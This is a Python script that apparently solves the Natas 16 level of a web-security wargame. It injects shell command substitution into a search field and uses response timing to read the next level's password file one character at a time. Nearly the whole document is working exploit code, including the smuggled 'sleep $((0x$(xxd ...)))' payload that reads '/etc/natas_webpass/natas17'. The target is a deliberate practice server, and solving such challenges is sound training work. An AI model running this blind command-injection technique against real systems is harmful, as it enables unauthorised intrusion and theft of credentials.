from natas import Natas
import os
from multiprocessing import Pool
import multiprocessing
import time

natas = Natas('natas16')

# grep -i ". /etc/natas_webpass/natas17 " dictionaty.txt


def get_response(payload: str=''):

    post = {
            'needle': payload
            }

    resp = natas.get_response(post_data=post)
    return resp


def get_exec_time(payload: str):
    start = time.time()
    get_response(payload)
    return time.time() - start


def get_normal_exec_time():
    return get_exec_time('1')


normal_exec_time = get_normal_exec_time()
print('Normal exec time is {}'.format(normal_exec_time))


def get_resp_interval(payload: str):
    exec_time = get_exec_time(payload)
    interval = exec_time - normal_exec_time
    return interval


def hack_letter(offset: int):
    length = '1'
    filename = '/etc/natas_webpass/natas17'
    offset = str(offset)
    payload = '1$(sleep $((0x$(xxd -p -s {} -l {} {}))))'.format(offset,
                                                                 length,
                                                                 filename)
    interval = get_resp_interval(payload)
    char = chr(round(interval))
    print('{}. character is {}'.format(offset, char))
    return char


# passlen_payload = '''
# $(sleep $(wc -c))
# '''
pass_len = 32
# get_resp_interval(passlen_payload) - 1
# -1 because of unix-style newline


def initiate_hacking():
    chars = []
    for i in range(32):
        chars.append(hack_letter(i))
        time.sleep(10)
    password = ''.join(chars)
    return password


def main():
    with open('natas17passwords', 'w', 1) as f:
        for _ in range(40):
            password = initiate_hacking()
            print(password)
            f.write(password + os.linesep)
            time.sleep(60)


if __name__ == '__main__':
    main()
